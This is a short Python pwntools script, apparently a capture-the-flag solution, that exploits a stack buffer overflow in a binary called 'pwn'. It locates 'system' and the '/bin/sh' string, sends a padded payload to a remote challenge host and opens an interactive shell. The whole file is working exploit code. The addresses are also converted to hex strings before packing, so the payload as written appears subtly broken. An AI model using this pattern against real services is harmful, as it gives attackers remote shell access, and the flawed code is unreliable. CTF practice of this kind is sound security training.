from pwn import *


def attack(url, port):
    elf = ELF('pwn')
    # bin_sh_addr = 0x0804A024
    # system_addr = 0x08048390
    bin_sh = next(elf.search(b'/bin/sh'))
    system = elf.sym['system']
    bin_sh_addr = hex(bin_sh)
    system_addr = hex(system)
    success('[+]bin_sh=' + hex(bin_sh))
    success('[+]system=' + hex(system))
    p = remote(url, port)
    # padlen = 0x48 + 0x4
    # payload = b'a' * padlen + p32(system_addr) + p32(bin_sh_addr)
    payload = flat('a' * 72, 'b' * 4, system_addr, 0, bin_sh_addr)
    p.sendlineafter("NISACTF\n", payload)
    #p.sendline(payload)
    p.interactive()


url = "node3.anna.nssctf.cn"
port = 28158
attack(url, port)